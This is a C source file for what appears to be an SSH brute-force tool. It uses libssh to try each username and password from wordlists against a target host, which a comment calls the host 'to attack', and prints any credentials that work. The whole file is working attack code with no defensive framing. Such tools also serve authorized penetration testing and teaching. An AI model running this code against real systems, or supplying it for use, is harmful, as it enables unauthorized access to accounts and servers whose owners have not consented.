#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include "thing-ssh.h"
#include <libssh/libssh.h>

void ssh_main();
int sshAttempt(char* destination, char* username, char* password, ssh_session my_ssh);
void sshOutput(int attemptStatus, ssh_session my_ssh);

void ssh_main() {
    if (usrFilename != NULL && passFilename != NULL) {
        // usrFile = fopen(usrFilename, "r");
        // passFile = fopen(passFilename, "r");
        
        // if (usrFile == NULL && passFile == NULL) {
        //     printf("File not found: %s\nFile not found: %s",usrFilename, passFilename);
        //     exit(1);
        // } else if (usrFile == NULL) {
        //     printf("File not found: %s\n",usrFilename);
        //     exit(1);
        // } else if (passFile == NULL) {
        //     printf("File not found: %s\n",passFilename);
        //     exit(1);
        // }

        while (fgets(usr, 256, usrFile) != NULL) {
            if(usr[strlen(usr)-1] == '\n') {
                usr[strlen(usr)-1] = '\0';
            }                
            while (fgets(pass, 256, passFile) != NULL) {
                // Replace new line with null to mark end of password
                if(pass[strlen(pass)-1] == '\n') {
                    pass[strlen(pass)-1] = '\0';
                }

                ssh_session my_ssh = ssh_new();
                if (sshAttempt(destination, usr, pass, my_ssh) == SSH_AUTH_SUCCESS) {
                    break;
                }   
            }
            rewind(passFile);
        }
        fclose(usrFile);
        fclose(passFile);
    } else if (usrFilename != NULL) {
        // usrFile = fopen(usrFilename, "r");
        // if (usrFile == NULL) {
        //     printf("File not found: %s\n",usrFilename);
        //     exit(1);
        // }
        while (fgets(usr, 256, usrFile) != NULL) {
            if(usr[strlen(usr)-1] == '\n') {
                usr[strlen(usr)-1] = '\0';
            }
            ssh_session my_ssh = ssh_new();
            sshAttempt(destination, usr, pass, my_ssh);   
        }
        fclose(usrFile);
    } else if (passFilename != NULL) {
        // passFile = fopen(passFilename, "r");
        // if (passFile == NULL) {
        //     printf("File not found: %s\n",passFilename);
        //     exit(1);
        // }
        while (fgets(pass, 256, passFile) != NULL) {
            if(pass[strlen(pass)-1] == '\n') {
                pass[strlen(pass)-1] = '\0';
            }            
            ssh_session my_ssh = ssh_new();
            if (sshAttempt(destination, usr, pass, my_ssh) == SSH_AUTH_SUCCESS) {
                break;
            }  
        }
        fclose(passFile);
    } else {
        ssh_session my_ssh = ssh_new();
        sshAttempt(destination, usr, pass, my_ssh);   
    }
}

/*
Input:
    - destination: IP address or hostname to attack
    - username and password for SSH login
    - my_ssh handler
Output: int attemptStatus. Tells whether the auth is sucessful.
*/
int sshAttempt(char* destination, char* username, char* password, ssh_session my_ssh) {
    //Configure the options before making an SSH connection
    ssh_options_set(my_ssh, SSH_OPTIONS_HOST, destination);
    ssh_options_set(my_ssh, SSH_OPTIONS_PORT, &port);
    ssh_options_set(my_ssh, SSH_OPTIONS_USER, usr);
    
    //Connect to SSH server
    int rc = ssh_connect(my_ssh);
    if (rc != SSH_OK) {
        fprintf(stderr, "Error connecting to host: %s\n",
            ssh_get_error(my_ssh));
        ssh_free(my_ssh);
        exit(-1);
    }

    //printf("Successful connection\n");
    //printf("User:%s, Pass:%s\n", usr, pass);
    int attemptStatus = ssh_userauth_password(my_ssh, NULL, pass);
    sshOutput(attemptStatus, my_ssh);
    return attemptStatus;
}

void sshOutput(int attemptStatus, ssh_session my_ssh) {
    if (attemptStatus == SSH_AUTH_SUCCESS) {
        printf("\033[0;32mAuthentication successful:\033[0m || Destination:%s || Username:%s || Password:%s\n", destination, usr, pass);
        ssh_disconnect(my_ssh);
    } else if(attemptStatus == SSH_AUTH_DENIED) {
        printf("\033[0;31mAuthentication failure:\033[0m Username:%s, Password:%s\n", usr, pass);
        ssh_disconnect(my_ssh);
    } else {
        fprintf(stderr, "Error authenticating with password: %s\n",
        ssh_get_error(my_ssh));
        ssh_disconnect(my_ssh);
    }
    
    ssh_free(my_ssh); //Do we really wanna free and allocate new ssh_session every time?
    return;
}